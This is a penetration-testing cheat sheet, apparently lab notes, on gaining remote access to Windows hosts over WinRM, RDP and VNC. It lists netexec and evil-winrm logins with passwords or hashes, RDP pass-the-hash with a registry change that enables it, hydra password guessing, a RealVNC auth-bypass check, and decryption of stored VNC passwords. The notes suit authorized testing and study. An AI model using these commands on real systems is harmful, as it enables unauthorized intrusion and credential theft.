# Remote access: WinRM, RDP and VNC

## Where this credential logs in
At the pwn-broker prompt: tool install netexec.
nxc winrm <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
nxc rdp <TargetIP> -d <Domain> -u '<Username>' -p '<Password>'
nxc winrm <TargetIP> -d <Domain> -u '<Username>' -H <Hash>
nxc winrm <TargetIP> -u '<Username>' -p '<Password>' --local-auth
- [ ] (Pwn3d!) on WinRM means I may open a shell there, not that I am an administrator
- [ ] A local account other than the built-in Administrator is often refused over WinRM: UAC remote restrictions

## WinRM with evil-winrm
evil-winrm -i <TargetIP> -u '<Username>' -p '<Password>'
evil-winrm -i <TargetIP> -u '<Username>' -H <Hash>
HTTPS, on 5986:
evil-winrm -i <TargetIP> -u '<Username>' -p '<Password>' -S
Inside the session:
upload <File>
download THE-REMOTE-PATH
menu
- [ ] upload takes a path on Kali, from the folder evil-winrm started in
- [ ] A remote path with spaces in double quotes
Scripts and programs from folders on Kali, loaded by typing a script's name, then menu:
evil-winrm -i <TargetIP> -u '<Username>' -p '<Password>' -s THE-PS1-FOLDER -e THE-EXE-FOLDER
- [ ] Or tools fetched with the line serve files gives: :Pb file-transfer

## WinRM with evil-winrm-py, from pwn-shop
At the pwn-broker prompt: tool install evil-winrm-py.
evil-winrm-py -i <TargetIP> -u '<Username>' -p '<Password>'
evil-winrm-py -i <TargetIP> -u '<Username>' -H <Hash>
HTTPS, on 5986:
evil-winrm-py -i <TargetIP> -u '<Username>' -p '<Password>' --ssl
- [ ] A different tool from Kali's Ruby evil-winrm: --ssl rather than -S, and no -s or -e directory options
- [ ] This package has no Kerberos extra; Kali's Ruby evil-winrm above remains separate
Inside the session, with absolute local and remote paths:
upload THE-LOCAL-PATH THE-REMOTE-PATH
download THE-REMOTE-PATH THE-LOCAL-PATH
menu

## RDP with xfreerdp3
xfreerdp3 /u:'<Username>' /p:'<Password>' /d:<Domain> /v:<TargetIP> /cert:ignore +clipboard /dynamic-resolution
xfreerdp3 /u:'<Username>' /p:'<Password>' /v:<TargetIP> /cert:ignore +clipboard /dynamic-resolution
Kali's current folder shared, as \\tsclient\share on the target:
xfreerdp3 /u:'<Username>' /p:'<Password>' /v:<TargetIP> /cert:ignore /drive:share,.
- [ ] Old guides use xfreerdp and /cert-ignore, from FreeRDP 2

## RDP with a hash
xfreerdp3 /u:'<Username>' /pth:<Hash> /v:<TargetIP> /cert:ignore
- [ ] A hash only works with Restricted Admin mode on
As a local administrator another way, to turn it on:
nxc smb <TargetIP> -u '<Username>' -H <Hash> --local-auth -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

## Guessing an RDP password
- [ ] The lockout threshold read first, with nxc smb --pass-pol: one password across many users beats many on one
hydra -l '<Username>' -P /usr/share/wordlists/rockyou.txt -t 4 -f rdp://<TargetIP>

## VNC
sudo nmap -sV -p 5800,5900-5910 --script vnc-info,vnc-title,realvnc-auth-bypass <TargetIP>
- [ ] Security type None in vnc-info: no password at all
- [ ] RealVNC 4.1.0 to 4.1.1: the auth bypass, and searchsploit realvnc
Display :1 is port 5901, and the double colon takes a port:
vncviewer <TargetIP>::<Port>
vncviewer -passwd passwd.txt <TargetIP>::<Port>
hydra -P /usr/share/wordlists/rockyou.txt vnc://<TargetIP>:<Port>

## A stored VNC password
- [ ] Found in ~/.vnc/passwd, an .ini file, or the registry under RealVNC, TightVNC or UltraVNC
reg query HKLM\SOFTWARE\RealVNC\WinVNC4 /v Password
reg query HKLM\SOFTWARE\TightVNC\Server /v Password
From a passwd file, its hex:
xxd -p passwd
It is DES with a key everyone knows, so it decrypts:
echo -n THE-HEX | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
- [ ] The password tried everywhere else: people reuse it
